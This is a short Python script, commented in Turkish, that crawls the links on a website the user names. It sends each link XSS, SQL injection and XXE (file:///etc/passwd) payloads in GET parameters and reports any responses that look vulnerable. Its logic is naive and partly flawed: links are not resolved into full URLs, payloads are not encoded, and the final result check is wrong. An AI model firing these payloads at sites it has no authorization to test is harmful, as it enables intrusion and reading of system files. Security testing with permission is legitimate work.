import requests
from bs4 import BeautifulSoup

def kontrol_et(url):
    """
    Belirtilen URL'yi tarayıp XSS, SQL ve XXE açıkları olup olmadığını kontrol eder.

    Parametreler:
        url: Kontrol edilecek URL.

    Döndürülen değer:
        Bulunan açıkların bir listesi.
    """
    aciklar = []

    # XSS açıklarını kontrol et
    for i in range(1, 10):
        payload = f"<script>alert('XSS açığı bulundu!')</script>"
        url_payload = url + f"?param{i}={payload}"
        response = requests.get(url_payload)
        if payload in response.text:
            aciklar.append("XSS açığı bulundu: " + url_payload)

    # SQL enjeksiyon açıklarını kontrol et
    for i in range(1, 10):
        payload = f"' OR 1=1;--"
        url_payload = url + f"?param{i}={payload}"
        response = requests.get(url_payload)
        if "Incorrect syntax near" in response.text:
            aciklar.append("SQL enjeksiyon açığı bulundu: " + url_payload)

    # XXE açıklarını kontrol et
    payload = "<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><xxe>&xxe;"
    url_payload = url + f"?param1={payload}"
    response = requests.get(url_payload)
    if "root:x:0:0:" in response.text:
        aciklar.append("XXE açığı bulundu: " + url_payload)

    return aciklar

# Kullanıcıdan web sitesi URL'sini al
url = input("Web sitesi URL'sini giriniz: ")

# URL'yi tara ve tüm URL'leri al
soup = BeautifulSoup(requests.get(url).content, "html.parser")
urls = [a["href"] for a in soup.find_all("a")]

# Her URL'yi kontrol et
for url in urls:
    aciklar = kontrol_et(url)
    if aciklar:
        print(f"URL'de açıklar bulundu: {url}")
        for acik in aciklar:
            print(acik)

if not aciklar:
    print("Herhangi bir açık bulunamadı.")
